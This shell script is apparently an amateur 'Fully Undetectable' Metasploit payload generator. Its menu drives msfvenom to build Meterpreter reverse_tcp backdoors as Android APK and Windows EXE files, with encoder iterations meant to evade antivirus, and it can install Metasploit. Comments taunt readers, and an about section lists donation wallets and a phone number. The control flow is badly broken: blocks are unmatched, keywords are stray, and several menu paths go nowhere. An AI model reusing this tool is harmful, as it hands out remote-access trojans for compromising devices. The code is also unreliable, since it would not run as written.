#!/bin/sh
# Ngapain Lu Liat liat Source Code Gw
# Mintak Source Gw Ya?
# Kalau Mau Decryprt Harus Bayar 500K Ke gw
# Dasar Noob!! Gak Usah Liat liat Njeng Source Code Gw
# Gw Doain Yg Decrypt Source Code Gw Mudah²an Dia Gak Punya Skill Hack Yg Bagus
# Amin...
# Don't copy this code without giving me the credits, Kiddie!
printf "                   _____     _ _                 \n"
printf "                  |__  /   _(_) | _____          \n"
printf "                    / / | | | | |/ / _ \         \n"
printf "                   / /| |_| | |   < (_) |        \n"
printf "                  /____\__,_|_|_|\_\___/         \n"
printf "                      __     _____  _            \n"
printf "                     \ \   / / _ \/ |            \n"
printf "                      \ \ / / | | | |            \n"
printf "                       \ V /| |_| | |            \n"
printf "                        \_/(_)___/|_|            \n"
echo  "/======================<[+########+]>=====================\\"
echo  "|                             #                            |"
echo  "|                   #Fully Undetectable#                   |"
echo  "|              #Metasploit Payload Generator#              |"
echo  "|             #Tested on Kali Linux by Kalyn2#             |"
echo  "|——————————[=]———————————————<#>————————————————[=]————————|"
echo  "|                                         Kalyn2 2019-2020 |"
echo  "\==========================================================/"
echo ""
sleep 2
# Check root
if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
echo '\e[0;31m【!!】 This script need root permission\e[0m' 1>&2
exit
fi

dr='pwd'
mkdir $dr/output
rm -rf $dr/output

sleep 8
echo "[1] Meterpreter_Reverse_tcp               [6] Shell_reverse_tcp"
echo "[2] Meterpreter_Reverse_http              [7] Powershell_reverse_tcp"
echo "[3] Meterpreter_Reverse_https             [8] List"
echo "[4] Meterpreter_Reverse_tcp_dns           [9] Help"
echo "[5] Install Package Metasploit            [10] Fix Eror Msfconsole"
echo "[11] Install Portforwading                [12] Costume Payload"
echo "[13] Encrypt Payload                      [14] Multi encode payload"
echo ""
read -p "Select a payload number: " int;done
if [ $int = "1" ]; then
echo "<[===List===]>"
echo "[1] Android"
echo "[2] Windows"
echo "[3] Linux"
else
 echo "[Exit] Check the number and list, please request to exit the program"
 exit 1
read -p "Select a platfrom number: " z
# meterpreter_reverse_tcp
  # Android tcp
  if [ $z = "1" ]; then
  read -p "Set lhost: " lh
  read -p "Set lport: " lp
  read -p "Iterations(1-500): " ite
  read -p "Save file(/desktop/filename.apk): " ot
  read -p "Arch(defaulth for android: dalvik " ai
  echo "Generate Payload For Android...."
  msfvenom -a $ai --platform android -i $ite -p android/meterpreter/reverse_tcp set lhost=$lh set lport=$lp -o $ot
  read -p "Open Metasploit?[Y/n]" ms
  elif [ $ms = "Y" "y" "Yes" "YES" "yes" ]; then
  msfconsole
  elif [ $ms = "n" "N" "No" "NO" "no" ]; then
  echo "Exit Program..."
  sleep 4
  exit 1
  else
   echo "[Exit] Check the number and list, please request to exit the program"
   exit 1
   # Windows tcp
   if [ $z = "2" ]; then
   read -p "Set lhost: " lhost
   read -p "Set lport: " lport
   read -p "Iterations(1-500): " iter
   read -p "Save file(desktop/filename.exe): " otg
   read -p "Encoders(default: x86/shikata_ga_nai): " enc
   read -p "Arch(default: x86): " al
   echo "Generate Payload For Windows..."
   msfvenom -a $al --platform windows -i $iter -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -b "\x00" -e $enc -f exe -o $otg
   read -p "Open Metasploit?[Y/n]" ms
   elif [ $ms = "Y" "y" "Yes" "YES" "yes" ]; then
   msfconsole
   elif [ $ms = "n" "N" "No" "NO" "no" ]; then
   echo "Exit Program..."
   sleep 4
   exit 1
   else
    echo "[Exit] Check the number and list, please request to exit the program"
    exit 1
    # Linux
    if [ $z = "3" ]; then
    echo "Masih Uji Coba Yang Bagian Linux"
      fi
    fi
  fi
fi

# Meterpreter revese_http
if [ $int = "2" ]; then
echo "<[===List===]>"
echo "[1] Android"
echo "[2] Windows"
echo "[3] Linux"
else
 echo "[Exit] Check the number and list, please request to exit the program"
 exit 1
read -p "Select a platfrom number: " op
if [ $op = "1" ]; then
read -p "Set lhost: " ip

if [ $int = "exit" "Exit" "EXIT" ]; then
clear; exit 1
elif [ $int = "about" "About" "ABOUT" "about" ]
echo "<===============[About]=================>"
echo "This Source Code Is Written By Kalyn2,\n I hope you never see this source code"
echo "Follow me so you can be notified"
echo "Facebook Home: Kalyn"
echo "Instagram Home: Kalyn2"
echo "Github Home: github.com/Mehanic385"
echo "Github Home2: github.com/Kalyn2"
echo ""
echo "Bro, Who want to donate me, so I can buy coffee :)"
echo "Dana: 082266694480"
echo "PayPal: https://www.paypal.me/Mehaniczezin"
echo "Wallet Doge: DMNcSPDjccz5JmQeUrZ58B5tWFBpXp9hgD"
echo "Wallet Bitcoin: 1JR5sq55DfQtQZoPmvKhdx5Ndk5AqTCSw2"
echo "Wallet Bitcoin Cash: qrz8s986e3f77hdnfnnr8hlmq089we57ryfvw9g4dc"
echo "Wallet Ethereum: 0x33fb86505f49d755a55e67138dc1d4a93545fcd7"
echo "Wallet Zcash: t1aP5Seu7MvbmDcqpuXaHWSeukuv6HW3Qhh"
echo "Wallet Monero: 89reiMvPEMfYAAyPQ9rVXx7mET8sPaJAsU42oxcMF6Fs3BX31WuvvhVFtD6mUdTAbQYYkJnL9chGcVx5TfjicCbR49eSFDr"
echo "Wallet Litecoin: LgenFi2pK9qzMHGEPb9XuQPHmr4jsKm1PV"

if [ $int = "9" "help" "HELP" "Help" "?" ]; then
echo "======[description]======"
echo ""
echo "[1-7] module payload"
echo "[5] Package Intaller"
echo "[8] List [Arch,Encoders,Encrypt]"
echo "[9] Help"
echo "[10] Fix Eror Gem"
echo ""
echo "========================="
echo "[about] About Build Source Code"
echo "[exit] Exit Program"
echo ""; fi

if [ $int = "5" ]; then
echo "[1] Install Metasploit"
echo "[2] Install Mono-Complete"
echo "[3] Install Mc"
echo "[4] Install Postgresql"
echo "[5] Install All Package"
read -p "Chose Number: " intl
if [ $intl = "1" ]; then
sudo apt install metasploit-framework -y
elif [ $intl = "2" ]; then
sudo apt install mono-complete -y
elif [ $intl = "3" ]; then
sudo apt install mc -y
elif [ $intl = "4" ]; then
sudo apt install postgresql -y
elif [ $intl = "5" ]; then
sudo apt install metasploit-framework mono-complete mc postgresql -y; if
